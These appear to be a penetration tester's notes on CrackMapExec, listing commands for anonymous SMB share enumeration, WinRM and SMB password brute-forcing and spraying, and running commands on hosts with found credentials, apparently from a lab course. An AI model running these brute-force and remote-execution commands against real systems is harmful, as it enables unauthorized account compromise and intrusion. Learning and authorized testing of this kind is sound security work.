This package is a swiss army knife for pentesting Windows/Active Directory environments.


We can utilize a utility called `crackmapexec` to perform a brute-force on WinRM in order to identify users and their passwords as well as execute commands on the target system.

CrackMapExec version 5.4.0 may throw the error The NETBIOS connection with the remote host is timed out for DCSRV1, or doesn't provide any output at all. Version 5.4.1 contains a fix to address this issue.



From enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLL's into memory using Powershell, dumping the NTDS.dit and more.



```
crackmapexec [IP]
crackmapexec [IP] --shares -u '' -p ''
crackmapexec [IP] --shares -u 'foobar' -p '' # may fall back to anonymous log in


crackmapexec winrm [IP] -u [USERS FILE] -p [PASSWORD FILE]
crackmapexec winrm [IP] -u administrator -p [PASSWORD FILE]

crackmapexec winrm [IP] -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm [IP] -u administrator -p tinkerbell -x "systeminfo"

Determine the level of access we have without performing additional enumeration.

If the user with the identified credentials has administrative privileges crackmapexec adds `Pwn3d!` to the output.

Another great CrackMapExec feature: it identifies the domain name and adds it to the usernames. It can tell whether is a domain-joined machine and if we have identified a valid set of domain credentials


```
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success

crackmapexec smb 192.168.50.242 -u usernames.txt -p passwords.txt --continue-on-success

list the SMB shares and their permissions
```
crackmapexec smb 192.168.50.242 -u john -p "dqsTwTpZPn#nL" --shares
